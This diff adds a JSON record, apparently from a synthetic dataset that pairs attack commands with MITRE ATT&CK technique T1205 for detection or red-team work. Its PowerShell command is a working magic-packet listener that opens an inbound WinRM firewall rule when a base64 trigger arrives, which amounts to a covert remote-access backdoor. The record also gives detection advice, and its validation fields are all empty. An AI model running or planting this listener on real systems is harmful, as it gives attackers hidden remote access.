@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ScriptBlock { $port=49152; $udp=New-Object System.Net.Sockets.UdpClient($port); $ep=New-Object System.Net.IPEndPoint([IPAddress]::Any,0); $data=$udp.Receive([ref]$ep); $udp.Close(); $msg=[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String([Text.Encoding]::ASCII.GetString($data))); if($msg -eq 'OPEN:5985'){ New-NetFirewallRule -DisplayName 'Temp WinRM Unlock' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5985 -Profile Any | Out-Null } }",
+  "explanation": "Implements a basic UDP magic-packet listener that decodes a base64 message 'OPEN:5985' and opens an inbound firewall rule for WinRM (5985). Detection: audit new firewall rules (Microsoft-Windows-Windows Firewall With Advanced Security logs), unexpected rules enabling WinRM, and UDP listeners on non-standard ports. Requires Administrator; if not already elevated, UAC prompt is triggered.",
+  "rationale_steps": [
+    "Receive and decode a base64 magic message as a trigger.",
+    "Create a firewall rule to enable WinRM inbound access on demand.",
+    "Provide detection guidance via firewall rule change auditing."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-1108f921-d5961ae1",
+  "source_prompt_hash": "1108f921",
+  "timestamp_utc": "2025-09-30T05:58:00.779201Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
